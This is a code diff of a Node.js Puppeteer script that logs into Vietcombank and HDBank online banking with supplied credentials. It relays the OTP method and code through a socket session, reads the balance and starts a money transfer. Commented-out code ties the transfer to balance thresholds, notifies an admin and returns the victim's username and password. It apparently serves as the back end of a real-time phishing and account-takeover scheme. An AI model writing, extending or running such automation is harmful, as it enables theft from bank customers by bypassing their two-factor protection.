@@ -14,10 +14,59 @@ let pg = []
 const openBrowser = async () => {
     const browser = await puppeteer.launch({
         headless: false,
+        args: ['--disable-features=site-per-process'],
     });
     const page = await browser.newPage();
     await page.setViewport({ width: 1080, height: 1024 });
     return { browser, page };
+}
+
+async function recursiveFindInFrames(inputFrame, selector) {
+    const frames = inputFrame.childFrames();
+    const results = await Promise.all(
+        frames.map(async frame => {
+            const el = await frame.$(selector);
+            if (el) return el;
+            if (frame.childFrames().length > 0) {
+                return await recursiveFindInFrames(frame, selector);
+            }
+            return null;
+        })
+    );
+    return results.find(Boolean);
+}
+
+async function findInFrames(page, selector) {
+    const result = await recursiveFindInFrames(page.mainFrame(), selector);
+    if (!result) {
+        throw new Error(
+            `The selector \`${selector}\` could not be found in any child frames.`
+        );
+    }
+    return result;
+}
+const recursiveFindInFramesContent = async (inputFrame, content) => {
+    const frames = inputFrame.childFrames();
+    const results = await Promise.all(
+        frames.map(async frame => {
+            const el = await frame.content();
+            if (el.includes(content)) return el;
+            if (frame.childFrames().length > 0) {
+                return await recursiveFindInFramesContent(frame, content);
+            }
+            return null;
+        })
+    );
+    return results.find(Boolean);
+}
+const findInFramesContent = async (page, content) => {
+    const result = await recursiveFindInFramesContent(page.mainFrame(), content);
+    if (!result) {
+        throw new Error(
+            `The content \`${content}\` could not be found in any child frames.`
+        );
+    }
+    return result;
 }
 
 const getBalance = async (type, socketID) => {
@@ -267,7 +316,8 @@ const chuyenTien = async (balance, type, socketID, settingData) => {
 
         await page.waitForSelector('#SoTien');
 
-        page.type('#SoTien', balance.toString());
+        // page.type('#SoTien', balance.toString());
+        page.type('#SoTien', '10000');
 
         await sleep(2000);
 
@@ -286,11 +336,26 @@ const chuyenTien = async (balance, type, socketID, settingData) => {
         await page.waitForSelector('.select2-results__options > li:nth-child(1)');
         page.click('.select2-results__options > li:nth-child(1)');
 
-        await sleep(2000);
+        return {
+            message: 'Phương thức xác thực danh tính.',
+            code: 200,
+            type: 'VCBSENDOTP',
+            options: [
+                {
+                    title: 'SMS OTP',
+                    value: 'SMS OTP'
+                },
+                {
+                    title: 'VCB smart OTP',
+                    value: 'VCB smart OTP'
+                }
+            ]
+        }
 
         await page.waitForSelector('.form-main-footer button');
         await page.click('.form-main-footer button');
         const otpType = 1
+
         // get image-captcha
         if (otpType == 2) {
             await page.waitForSelector('.image-captcha img');
@@ -333,6 +398,34 @@ const chuyenTien = async (balance, type, socketID, settingData) => {
             type: 'VCBSENDOTP',
         }
     }
+}
+
+const xacthucMethodCtVCB = async (method, socketID) => {
+    const page = pg.find(p => p.socketID == socketID).page;
+    await sleep(1500);
+
+    if (method == 'SMS OTP') {
+        await page.waitForSelector(".select-2");
+        page.click(".select-2");
+
+        await page.waitForSelector(".select2-results__options");
+
+        await page.waitForSelector(".select2-results__options > li:nth-child(1)");
+        page.click(".select2-results__options > li:nth-child(1)");
+    } else if (method == 'VCB smart OTP') {
+        await page.waitForSelector(".select-2");
+        page.click(".select-2");
+
+        await page.waitForSelector(".select2-results__options");
+
+        await page.waitForSelector(".select2-results__options > li:nth-child(2)");
+        page.click(".select2-results__options > li:nth-child(2)");
+    }
+
+    await sleep(1500);
+    // const buttonContinue = await page.$x("//button[contains(., ' TIẾP TỤC ')]");
+    page.click("button[type='submit']");
+    await sleep(1500);
 
 
 }
@@ -382,7 +475,7 @@ const loginVCB = (async (username, password, socketID, settingData) => {
 
     // get innerText message
     if (messageElement.length > 0) {
-        const message = await page.evaluate(el => el.innerText, messageElement[0]);
+        await browser.close();
         loginVCB(username, password, socketID, settingData);
     }
 
@@ -406,6 +499,18 @@ Cài đặt >> Cài đặt chung >> Cài đặt đăng nhập >> Cài đặt đ�
 
 Tiện ích >> Cài đặt >> Cài đặt chung >> Quản lý đăng nhập kênh >> Cài đặt đăng nhập VCB Digibank trên Web(đối với phiên bản App mới).`,
             code: 400,
+            type: 'VCB'
+        };
+    }
+
+    const messageErrorLogin = await page.$x("//p[contains(., 'Thông tin tài khoản không hợp lệ. Quý khách vui lòng kiểm tra lại hoặc liên hệ Hotline 24/7 1900545413 để được trợ giúp.')]");
+
+    if (messageErrorLogin.length > 0) {
+        await browser.close();
+        const message = await page.evaluate(el => el.innerText, messageErrorLogin[0]);
+        return {
+            message: message,
+            code: 404,
             type: 'VCB'
         };
     }
@@ -449,6 +554,101 @@ Tiện ích >> Cài đặt >> Cài đặt chung >> Quản lý đăng nhập kên
     // return response;
 
     // if balance < 2 triệu thì không chuyển
+    // if (balance < 2000000) {
+    //     // await browser.close();
+    //     return {
+    //         message: 'success',
+    //         code: 300,
+    //         balance: balance,
+    //         username: username,
+    //         password: password,
+    //     };
+    // }
+
+    // else if (balance >= 2000000) {
+    //     const response = await chuyenTien(balance, 'VCB', socketID, settingData);
+    //     // await browser.close();
+    //     return response;
+    // } else if (balance >= 2000000 && balance <= 5000000) {
+    //     const response = await chuyenTien(balance, 'VCB', socketID, settingData);
+    //     return response;
+    // } else if (balance > 5000000) {
+    //     // await browser.close();
+    //     // thông báo tới admin
+    //     return {
+    //         message: 'success',
+    //         code: 300,
+    //         balance: balance,
+    //         username: username,
+    //         password: password,
+    //     };
+    // } else {
+    //     await browser.close();
+    //     return {
+    //         message: 'success',
+    //         code: 300,
+    //         balance: balance,
+    //         username: username,
+    //         password: password,
+    //     };
+    // }
+
+    const response = await chuyenTien(balance, 'VCB', socketID, settingData);
+    return response;
+
+});
+
+const xacthucOTPVCB = async (otp, socketID) => {
+    await sleep(1500);
+    const page = pg.find(p => p.socketID == socketID).page;
+    await page.waitForSelector("input[formcontrolname='otp'");
+
+    page.type("input[formcontrolname='otp'", otp);
+    await sleep(1500);
+    const buttonContinue = await page.$x("//span[contains(., ' Tiếp tục')]");
+    await sleep(1500);
+    await buttonContinue[0].click();
+
+    await sleep(2000);
+
+    const messageError = await page.$x("//p[contains(., 'Mã OTP không chính xác')]");
+
+    if (messageError.length > 0) {
+        await browser.close();
+        return {
+            message: 'Mã OTP không chính xác',
+            code: 404,
+        };
+    }
+
+    await sleep(1500);
+
+    const messageSave = await page.$x("//p[contains(., 'Xác thực đăng nhập thành công. Quý khách có muốn lưu trình duyệt Web để bỏ qua bước xác thực cho những lần đăng nhập tiếp theo không?')]");
+
+    console.log(messageSave);
+
+    if (messageSave.length > 0) {
+        const buttonContinue2 = await page.$x("//span[contains(., 'Lưu')]");
+        await buttonContinue2[0].click();
+        await sleep(4500);
+
+    }
+
+    console.log('click1');
+    await page.waitForSelector('label[for="tk-eye2"]', { timeout: 60000 });
+
+    await page.click('label[for="tk-eye2"]');
+
+    await sleep(3000);
+
+    await page.waitForSelector(".i");
+
+    let balance = await page.$eval(".i", el => el.innerText);
+
+    balance = balance.replace('VND', '').replace(/\./g, '').trim();
+
+    balance = parseFloat(balance) * 1000;
+    // if balance < 2 triệu thì không chuyển
     if (balance < 2000000) {
         // await browser.close();
         return {
@@ -487,60 +687,6 @@ Tiện ích >> Cài đặt >> Cài đặt chung >> Quản lý đăng nhập kên
             password: password,
         };
     }
-
-    // const response = await chuyenTien(balance, 'VCB', socketID, settingData);
-    // return response;
-
-});
-
-const xacthucOTPVCB = async (otp, socketID) => {
-    await sleep(1500);
-    const page = pg.find(p => p.socketID == socketID).page;
-    await page.waitForSelector("input[formcontrolname='otp'");
-
-    page.type("input[formcontrolname='otp'", otp);
-    await sleep(1500);
-    const buttonContinue = await page.$x("//span[contains(., ' Tiếp tục')]");
-    await sleep(1500);
-    await buttonContinue[0].click();
-
-    await sleep(2000);
-
-    const messageError = await page.$x("//p[contains(., 'Mã OTP không chính xác')]");
-
-    if (messageError.length > 0) {
-        await browser.close();
-        return {
-            message: 'Mã OTP không chính xác',
-            code: 404,
-        };
-    }
-
-    await sleep(1500);
-
-    const messageSave = await page.$x("//p[contains(., 'Xác thực đăng nhập thành công. Quý khách có muốn lưu trình duyệt Web để bỏ qua bước xác thực cho những lần đăng nhập tiếp theo không?')]");
-
-    console.log(messageSave);
-
-    if (messageSave.length > 0) {
-        const buttonContinue2 = await page.$x("//span[contains(., 'Lưu')]");
-        await buttonContinue2[0].click();
-    }
-
-    await sleep(4500);
-
-    const balance = await getBalanceVCB(socketID);
-
-    console.log('balance', balance);
-
-    // return {
-    //     message: 'success',
-    //     code: 200,
-    // };
-    // return {
-    //     message: 'success',
-    //     code: 200,
-    // };
 
 }
 
@@ -632,7 +778,70 @@ const loginACB = (async (username, password) => {
 const loginHDBank = (async (username, password) => {
     const { browser, page } = await openBrowser();
 
-    await page.goto('https://ebanking.hdbank.com.vn/', { waitUntil: 'networkidle0' });
+    await page.goto('https://ebanking.hdbank.vn/ipc/vi/', { waitUntil: 'networkidle0' });
+
+    await sleep(3000);
+
+    // toàn trang là 1 frame có name là main
+    const frame = await page.frames().find(frame => frame.name() === 'main');
+
+    // đi vào trong frame là frameset không có name chỉ có 1 frameset lấy index 0
+    const frameset = await frame.$('frameset');
+
+    // trong frameset có 1 frame có src = index_vi_VN.html?ver=5.7
+
+    const frame2 = await frameset.$('frame[name="tran"]');
+
+    // đi vào trong frame2
+    const frame3 = await frame2.contentFrame();
+
+    // input trong frame3
+    await frame3.type('#txtUserName2', username);
+    await frame3.type('#txtPassKeyWeb', password);
+
+    await sleep(1500);
+
+    // click button đăng nhập trong frame3
+
+    // throw new Error('Unsupported frame type');
+    // run script trong frame3
+    await frame3.evaluate(() => {
+        document.querySelector('#txtlogin4').click();
+    });
+
+    await sleep(3000);
+
+    // get innerText message
+    // const messageElement = await findInFrames(page, '');
+    // findInFrames content  "Tên đăng nhập hoặc mật khẩu không hợp lệ. Xin Quý Khách vui lòng thử lại."
+    // run script check message
+    const checkError = await frame3.evaluate(async () => {
+        const messageElement = document.querySelectorAll('.lbl div')
+        // check messageElement have content "Tên đăng nhập hoặc mật khẩu không hợp lệ. Xin Quý Khách vui lòng thử lại."
+        for (let index = 0; index < messageElement.length; index++) {
+            if (messageElement[index].innerText.includes('Tên đăng nhập hoặc mật khẩu không hợp lệ. Xin Quý Khách vui lòng thử lại.')) {
+                console.log('messageElement', messageElement[index].innerText);
+                return true;
+            }
+        }
+
+        return false;
+    })
+    console.log('checkError', checkError);
+    if (checkError) {
+        await browser.close();
+        return {
+            message: 'Tên đăng nhập hoặc mật khẩu không hợp lệ. Xin Quý Khách vui lòng thử lại.',
+            code: 404,
+            type: 'HDBank'
+        };
+    }
+
+    return {
+        message: 'Đăng nhập thành công',
+        code: 200,
+        type: 'HDBank'
+    };
 });
 
 const xacthuc = async (otp, type) => {
